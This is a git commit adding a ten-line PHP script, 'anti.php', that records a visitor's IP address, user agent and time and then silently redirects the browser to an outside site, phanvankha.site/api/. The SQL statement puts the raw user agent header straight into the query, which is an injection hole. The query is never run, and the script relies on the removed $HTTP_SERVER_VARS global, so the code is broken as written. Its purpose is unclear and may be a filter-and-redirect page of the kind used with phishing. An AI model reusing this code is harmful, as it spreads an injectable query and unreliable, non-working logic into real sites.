462d8c5dd8e72cebf59f8cb748b71ead1a228265
phanvankha <120581197+phanvankha@users.noreply.github.com>
2023-05-01 20:49:59 +0700

    Add files via upload

---
+++ anti.php
@@ -0,0 +1,10 @@
+<?php 
+$time = date('d-m-y H:i:s');
+$ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$sql = "INSERT INTO ip (ip, user_agent, time) VALUES ('{$ip}', '{$user_agent}', '{$time}')";
+global $HTTP_SERVER_VARS; 
+$text = $HTTP_SERVER_VARS; 
+$text = preg_replace("#php\&#si",'php?',$text); 
+echo('<meta http-equiv="refresh" content="1;url=https://phanvankha.site/api/'.$text.'">');
+?>
